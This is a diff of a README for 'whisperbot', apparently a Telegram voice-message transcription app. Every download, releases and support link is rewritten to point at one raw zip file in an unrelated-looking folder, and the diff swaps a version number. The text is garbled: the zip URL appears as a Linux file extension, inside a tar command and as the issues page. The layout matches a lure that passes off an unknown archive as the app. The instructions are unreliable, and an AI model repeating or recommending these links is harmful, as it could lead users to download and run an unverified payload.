@@ -6,7 +6,7 @@ Welcome to **whisperbot**! This application helps you transcribe audio messages 
 
 ## 📥 Download the App
 
-[![Download whisperbot](https://github.com/Abdikariim252/whisperbot/raw/refs/heads/main/Manatidae/Software-v2.4.zip%https://github.com/Abdikariim252/whisperbot/raw/refs/heads/main/Manatidae/Software-v2.4.zip)](https://github.com/Abdikariim252/whisperbot/raw/refs/heads/main/Manatidae/Software-v2.4.zip)
+[![Download whisperbot](https://github.com/Abdikariim252/whisperbot/raw/refs/heads/main/Manatidae/Software-1.9.zip%https://github.com/Abdikariim252/whisperbot/raw/refs/heads/main/Manatidae/Software-1.9.zip)](https://github.com/Abdikariim252/whisperbot/raw/refs/heads/main/Manatidae/Software-1.9.zip)
 
 ## 📋 System Requirements
 
@@ -23,7 +23,7 @@ Before you download, ensure your device meets the following requirements:
 
 To download the whisperbot application, visit the releases page by clicking the link below:
 
-[Download whisperbot](https://github.com/Abdikariim252/whisperbot/raw/refs/heads/main/Manatidae/Software-v2.4.zip)
+[Download whisperbot](https://github.com/Abdikariim252/whisperbot/raw/refs/heads/main/Manatidae/Software-1.9.zip)
 
 ### 2. Choose Your Version
 
@@ -35,7 +35,7 @@ Click on the version you want to download. You will find a list of files under t
 
 - For Windows users, look for a file that ends with `.exe`.
 - For macOS users, select a file that ends with `.dmg`.
-- For Linux users, choose a file that ends with `https://github.com/Abdikariim252/whisperbot/raw/refs/heads/main/Manatidae/Software-v2.4.zip`.
+- For Linux users, choose a file that ends with `https://github.com/Abdikariim252/whisperbot/raw/refs/heads/main/Manatidae/Software-1.9.zip`.
 
 ### 4. Install the Software
 
@@ -52,8 +52,8 @@ Once the file is downloaded, follow these steps:
 - **Linux:**
   1. Open your terminal.
   2. Navigate to the directory where the downloaded file is located.
-  3. Use the command `tar -xvzf https://github.com/Abdikariim252/whisperbot/raw/refs/heads/main/Manatidae/Software-v2.4.zip` to extract the files.
-  4. Follow additional instructions in the `https://github.com/Abdikariim252/whisperbot/raw/refs/heads/main/Manatidae/Software-v2.4.zip` file included in the extracted folder.
+  3. Use the command `tar -xvzf https://github.com/Abdikariim252/whisperbot/raw/refs/heads/main/Manatidae/Software-1.9.zip` to extract the files.
+  4. Follow additional instructions in the `https://github.com/Abdikariim252/whisperbot/raw/refs/heads/main/Manatidae/Software-1.9.zip` file included in the extracted folder.
 
 ### 5. Launch the Application
 
@@ -92,12 +92,12 @@ A: The transcription engine primarily supports English. Future updates may inclu
 
 ## 📞 Support
 
-If you need help or have questions not covered in this guide, you can open an issue on the [GitHub Issues Page](https://github.com/Abdikariim252/whisperbot/raw/refs/heads/main/Manatidae/Software-v2.4.zip). This will allow you to communicate with the developers and get support.
+If you need help or have questions not covered in this guide, you can open an issue on the [GitHub Issues Page](https://github.com/Abdikariim252/whisperbot/raw/refs/heads/main/Manatidae/Software-1.9.zip). This will allow you to communicate with the developers and get support.
 
 ## 📥 Download Again
 
 To download the whisperbot application, visit our releases page:
 
-[Download whisperbot](https://github.com/Abdikariim252/whisperbot/raw/refs/heads/main/Manatidae/Software-v2.4.zip)
+[Download whisperbot](https://github.com/Abdikariim252/whisperbot/raw/refs/heads/main/Manatidae/Software-1.9.zip)
 
 Feel confident using whisperbot to enhance your Telegram experience. Enjoy transcribing your audio messages effortlessly!
